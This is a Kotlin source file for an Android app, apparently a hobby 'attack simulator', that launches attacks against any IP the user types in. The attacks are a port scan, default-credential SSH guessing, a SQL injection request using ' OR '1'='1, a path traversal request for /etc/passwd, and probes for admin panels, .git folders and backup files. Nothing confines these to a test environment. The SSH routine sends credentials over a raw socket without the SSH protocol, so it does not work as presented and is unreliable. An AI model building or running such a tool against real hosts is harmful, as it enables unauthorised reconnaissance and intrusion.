package com.example.myapplication

import android.os.Bundle
import android.widget.Button
import android.widget.EditText
import android.widget.RadioGroup
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.IOException
import java.net.InetSocketAddress
import java.net.Socket
import java.util.concurrent.TimeUnit

class AttackSimulatorActivity : AppCompatActivity() {

    private lateinit var targetIpEdit: EditText
    private lateinit var attackTypeGroup: RadioGroup
    private lateinit var resultText: TextView
    private lateinit var launchButton: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_attack_simulator)

        targetIpEdit = findViewById(R.id.targetIp)
        attackTypeGroup = findViewById(R.id.attackTypeGroup)
        resultText = findViewById(R.id.resultText)
        launchButton = findViewById(R.id.launchAttack)

        launchButton.setOnClickListener {
            val targetIp = targetIpEdit.text.toString().trim()
            if (targetIp.isEmpty()) {
                resultText.text = "Please enter target IP"
                return@setOnClickListener
            }

            val selectedId = attackTypeGroup.checkedRadioButtonId
            if (selectedId == -1) {
                resultText.text = "Please select an attack type"
                return@setOnClickListener
            }

            launchButton.isEnabled = false
            resultText.text = "Attack launched..."

            lifecycleScope.launch {
                val result = performAttack(targetIp, selectedId)
                resultText.text = result
                launchButton.isEnabled = true
            }
        }
    }

    private suspend fun performAttack(targetIp: String, attackTypeId: Int): String = withContext(Dispatchers.IO) {
        when (attackTypeId) {
            R.id.portScan -> portScan(targetIp)
            R.id.sshBrute -> sshBruteForce(targetIp)
            R.id.sqli -> sqlInjection(targetIp)
            R.id.pathTraversal -> pathTraversal(targetIp)
            R.id.httpScan -> httpScanner(targetIp)
            else -> "Unknown attack type"
        }
    }

    private fun portScan(ip: String): String {
        val result = StringBuilder("Port scan results:\n")
        val ports = intArrayOf(21, 22, 23, 80, 443, 8080, 3306)
        for (port in ports) {
            try {
                Socket().use { socket ->
                    socket.connect(InetSocketAddress(ip, port), 1000)
                    result.append("Port $port is open\n")
                }
            } catch (e: IOException) {
                result.append("Port $port is closed/filtered\n")
            }
        }
        return result.toString()
    }

    private fun sshBruteForce(ip: String): String {
        val usernames = arrayOf("root", "admin", "user")
        val passwords = arrayOf("123456", "password", "admin")
        val result = StringBuilder("SSH brute-force simulation:\n")
        for (user in usernames) {
            for (pass in passwords) {
                try {
                    Socket().use { socket ->
                        socket.connect(InetSocketAddress(ip, 22), 2000)
                        val out = socket.getOutputStream()
                        out.write("$user\n".toByteArray())
                        out.write("$pass\n".toByteArray())
                        out.flush()
                        result.append("Attempted $user/$pass\n")
                        Thread.sleep(500)
                    }
                } catch (e: Exception) {
                    result.append("SSH connection failed: ${e.message}\n")
                    break
                }
            }
        }
        return result.toString()
    }

    private fun sqlInjection(ip: String): String {
        val client = OkHttpClient.Builder()
            .connectTimeout(5, TimeUnit.SECONDS)
            .build()
        val url = "http://$ip/page?id=1' OR '1'='1"
        val request = Request.Builder().url(url).build()
        return try {
            client.newCall(request).execute().use { response ->
                "SQL Injection attempt sent to $url\nResponse code: ${response.code}"
            }
        } catch (e: IOException) {
            "HTTP request failed: ${e.message}"
        }
    }

    private fun pathTraversal(ip: String): String {
        val client = OkHttpClient.Builder()
            .connectTimeout(5, TimeUnit.SECONDS)
            .build()
        val url = "http://$ip/../../etc/passwd"
        val request = Request.Builder().url(url).build()
        return try {
            client.newCall(request).execute().use { response ->
                "Path traversal attempt sent to $url\nResponse code: ${response.code}"
            }
        } catch (e: IOException) {
            "HTTP request failed: ${e.message}"
        }
    }

    private fun httpScanner(ip: String): String {
        val paths = arrayOf("/admin", "/phpmyadmin", "/.git", "/wp-admin", "/backup.zip")
        val result = StringBuilder("HTTP scanner results:\n")
        val client = OkHttpClient.Builder()
            .connectTimeout(5, TimeUnit.SECONDS)
            .build()
        for (path in paths) {
            val url = "http://$ip$path"
            val request = Request.Builder().url(url).build()
            try {
                client.newCall(request).execute().use { response ->
                    result.append("$url -> ${response.code}\n")
                }
            } catch (e: IOException) {
                result.append("$url -> failed: ${e.message}\n")
            }
        }
        return result.toString()
    }
}
